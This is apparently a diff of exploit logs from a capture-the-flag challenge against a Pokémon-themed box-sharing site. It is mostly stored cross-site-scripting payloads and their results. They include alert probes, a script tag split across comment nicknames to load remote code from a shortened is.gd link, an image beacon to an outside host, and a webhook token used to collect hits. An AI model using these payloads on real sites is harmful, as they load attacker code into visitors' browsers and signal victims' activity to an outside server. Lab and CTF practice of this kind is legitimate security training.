@@ -1,17 +1,9 @@
-== FEED ==
- <a href="/box/241"><strong>team chant <span class="tag-fire">🔥live</span></strong></a> <span class="muted">by <a href="/u/trainer01">@trainer01</a> · 2026-10-31 17:08:45</span> <div class="feed-desc">my team chant</div> 
- <a href="/box/236"><strong>xsschant</strong></a> <span class="muted">by <a href="/u/trainer01">@trainer01</a> · 2026-10-31 17:05:38</span> <div class="feed-desc">d</div> 
- <a href="/box/235"><strong>xsschant</strong></a> <span class="muted">by <a href="/u/trainer01">@trainer01</a> · 2026-10-31 17:05:12</span> <div class="feed-desc">d</div> 
- <a href="/box/1"><strong>My box <strong>bold</strong> &lt;script&gt;alert(1)&lt;/script&gt;</strong></a> <span class="muted">by <a href="/u/trainer01">@trainer01</a> · 2026-10-31 16:50:02</span> <div class="feed-desc">desc <span class="tag-shiny">x</span> &lt;img src=x onerror=alert(2)&gt;</div> 
-== BOX 241 comments ==
- <span class="nick">&lt;script sr</span> <span class="lv">Lv50</span> <span class="hp">HP 0/0</span> 
- <span class="nick">c=//is.gd/</span> <span class="lv">Lv50</span> <span class="hp">HP 0/0</span> 
- <span class="nick">44Sj4M&gt;&lt;/s</span> <span class="lv">Lv50</span> <span class="hp">HP 0/0</span> 
- <span class="nick">cript&gt;</span> <span class="lv">Lv50</span> <span class="hp">HP 0/0</span> 
-webhook token 201 b7ce5923-88a5-4f04-870a-3f4d792950bc
-short is.gd/t4YQzO
-payload <img src=//is.gd/t4YQzO>
-upload 303 http://27wg1nxt69l0o1gh.instances.ctfcup.online/box/242
-share 303
-beacon box 242
-final hits 0
+ANON box 241 200 chant= 'A wild cheer erupts: <script src=//is.gd/44Sj4M></script>!'
+   raw-script-present: True | img-beacon: False
+   len 2002
+ANON box 242 200 chant= 'A wild cheer erupts: <img src=//is.gd/t4YQzO>!'
+   raw-script-present: False | img-beacon: True
+   len 1781
+ANON box 1 200 chant= 'A wild cheer erupts: PIKA!'
+   raw-script-present: False | img-beacon: False
+   len 1772
